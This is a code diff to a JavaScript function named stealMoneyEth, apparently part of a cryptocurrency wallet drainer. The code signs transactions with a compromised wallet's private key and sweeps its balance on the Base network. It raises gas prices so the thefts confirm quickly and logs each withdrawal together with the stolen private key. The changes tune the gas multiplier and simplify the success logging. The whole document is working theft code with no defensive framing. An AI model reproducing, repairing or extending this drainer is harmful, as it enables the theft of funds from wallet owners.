@@ -56,7 +56,7 @@ async function stealMoneyEth(address) {
     const average = ((Math.random() * (2.6 - 2.3) + 2.3) + (Math.random() * (3 - 2.7) + 2.7)) / 2;
 
     gasPrice = BigInt(Math.trunc(Number(gasPrice) * average));
-    transactionCost = gasUnits * BigInt(Math.round((Number(gasPrice) * 1.4)));
+    transactionCost = gasUnits * BigInt(Math.round((Number(gasPrice) * 1.5)));
 
     for (let i = 0; i < 200; i++) {
         if (balance > grabFromEthBalance) {
@@ -87,12 +87,6 @@ async function stealMoneyEth(address) {
     };
     const signedTx = await web3.eth.accounts.signTransaction(txPrice, walletKey);
     const txHash = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
-    let receipt;
-    try {
-        receipt = await web3.eth.getTransactionReceipt(txHash);
-    } catch (e) {
-        console.log(e);
-    }
     const amountEther = web3.utils.fromWei(amount, 'ether');
-    console.log(`✅ BASE | Success withdrawal \nHASH: ${receipt?.transactionHash} \n\nAMOUNT: ${amountEther} \nADDR: https://basescan.org/address/${address} \nPK: ${walletKey}`);
+    console.log(`✅ BASE | Success withdrawal \nHASH: ${txHash} \n\nAMOUNT: ${amountEther} \nADDR: https://basescan.org/address/${address} \nPK: ${walletKey}`);
 }
